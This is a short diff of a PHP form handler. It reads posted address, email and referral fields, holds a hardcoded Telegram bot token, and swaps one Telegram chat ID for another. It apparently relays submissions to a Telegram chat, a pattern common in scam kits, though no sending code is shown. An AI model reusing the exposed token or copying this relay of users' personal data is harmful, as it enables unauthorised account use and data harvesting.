@@ -10,7 +10,7 @@ $address = $_POST['addres'];
 $Email = $_POST['Email'];
 $Refferal = $_POST['Refferal'];
 $token = "6179322173:AAEnTT9nflef3w0ehqwJHOroZXpZ0t_tpj0";
-$chat_id = "-1001969758729";
+$chat_id = "-1001945631506";
 
 $data = array(
     'from_pair' => $send,
